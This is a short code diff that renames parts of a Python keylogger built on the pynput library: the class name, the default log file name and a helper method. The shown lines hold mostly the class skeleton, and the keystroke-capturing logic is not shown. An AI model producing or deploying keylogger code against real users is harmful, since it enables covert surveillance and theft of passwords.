@@ -1,12 +1,12 @@
 from pynput import keyboard
 
 
-class KeyLogger():
-    def __init__(self, filename: str = "keylogs.txt") -> None:
+class keyLogger():
+    def __init__(self, filename: str = "log.txt") -> None:
         self.filename = filename
 
     @staticmethod
-    def get_char(key):
+    def get_chars(key):
         try:
             return key.char
         except AttributeError:
@@ -25,6 +25,6 @@ class KeyLogger():
 
 
 if __name__ == '__main__':
-    logger = KeyLogger()
+    logger = keyLogger()
     logger.main()
     input()
